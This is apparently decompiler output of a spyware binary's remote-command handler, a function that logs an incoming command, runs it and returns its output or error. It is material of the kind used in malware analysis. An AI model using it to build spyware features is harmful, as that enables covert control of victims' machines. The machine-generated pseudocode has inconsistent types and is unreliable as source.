fn spyware::actions::commands::run_command_message(a1: &struct32) -> : struct52 {
    let a0: i64;  // rdi
    let v0: alloc::string::String;  // [bp-0xc8], Other Possible Types: struct40
    let v1: u64;  // [bp-0xc8]
    let v2: alloc::string::String;  // [bp-0xc8]
    let v3: struct24;  // [bp-0xb8]
    let v4: i64;  // [bp-0x98], Other Possible Types: u64
    let v5: u64;  // [bp-0x90]
    let v6: struct9;  // [bp-0x88], Other Possible Types: struct24, u64
    let v7: Result<struct48, struct13>;  // [bp-0x84]
    let v8: struct24;  // [bp-0x80], Other Possible Types: u64
    let v9: struct64;  // [bp-0x78], Other Possible Types: struct_1 *
    let v10: struct8;  // [bp-0x70], Other Possible Types: u64
    let v11: struct32;  // [bp-0x68], Other Possible Types: void*
    let v12: struct24;  // [bp-0x58], Other Possible Types: struct_1 *
    let v13: u128;  // [bp-0x58]
    let v14: struct64;  // [bp-0x50], Other Possible Types: u64
    let v15: core::fmt::Arguments;  // [bp-0x48]
    let v16: struct24;  // [bp-0x38]
    let v17: u64;  // [bp-0x30]
    let v18: i8;  // [bp-0x28]
    let v20: u64;  // r15

    if core::sync::atomic::atomic_load() >= 4 {
        v16 = a1;
        v12 = &v16;
        v14 = <&T as core::fmt::Display>::fmt;
        *(&v6 as &&str) = "Got run command request: run command \"";
        v8 = 2;
        v11 = 0;
        v9 = &v12;
        v10 = 1;
        v0 = struct40 {
            field_0: "spyware::actions::commands"
            field_16: "spyware::actions::commands"
            field_32: log::__private_api::loc("src/actions/commands.rs")
        };
        log::__private_api::log(&v6, 4, &v0);
    }
    spyware::actions::commands::run_command(&v16, *((a1 + 8) as &i64), *((a1 + 16) as &i64));
    if (((0 ^ v16) & (0 ^ -(v16))) >> 63) as char {
        v4 = v17;
        v0 = v1;
        if core::sync::atomic::atomic_load() {
            v12 = &v4;
            v14 = <std::io::error::Error as core::fmt::Display>::fmt;
            *(&v6 as &&str) = "Command execution failed, error: ";
            v8 = 1;
            v11 = 0;
            v9 = &v12;
            v10 = 1;
            v0 = struct40 {
                field_0: "spyware::actions::commands"
                field_16: "spyware::actions::commands"
                field_32: log::__private_api::loc("src/actions/commands.rs")
            };
            log::__private_api::log(&v6, 1, &v0);
            v0 = v2;
        }
        v6 = <T as alloc::slice::hack::ConvertVec>::to_vec();
        v3 = v9;
        v1 = v6.field_0;
        v6 = std::io::error::repr_bitpacked::decode_repr(v4);
        v20 = v6.field_0;
        v6 = <T as alloc::string::SpecToString>::spec_to_string(&v4);
        return struct56 {
            field_0: v1
            field_16: v3
            field_24: v6.field_0
            field_40: v9
            field_48: -((0 < (v20 & 255)) as u8 as u32) | v7
        };
    } else {
        v15 = *(&v18 as &i64);
        v13 = v16.field_0;
        if core::sync::atomic::atomic_load() < 4 {
            return struct32 {
                field_0: v13
                field_16: v15
                field_24: 0x8000000000000000
            };
        }
        v4 = &v13;
        v5 = <alloc::string::String as core::fmt::Display>::fmt;
        *(&v6 as &&str) = "Command execution succeed, output: ";
        v8 = 1;
        v11 = 0;
        v9 = &v4;
        v10 = 1;
        v0 = struct40 {
            field_0: "spyware::actions::commands"
            field_16: "spyware::actions::commands"
            field_32: log::__private_api::loc("src/actions/commands.rs")
        };
        log::__private_api::log(&v6, 4, &v0);
        return struct32 {
            field_0: v13
            field_16: v15
            field_24: 0x8000000000000000
        };
    }
}
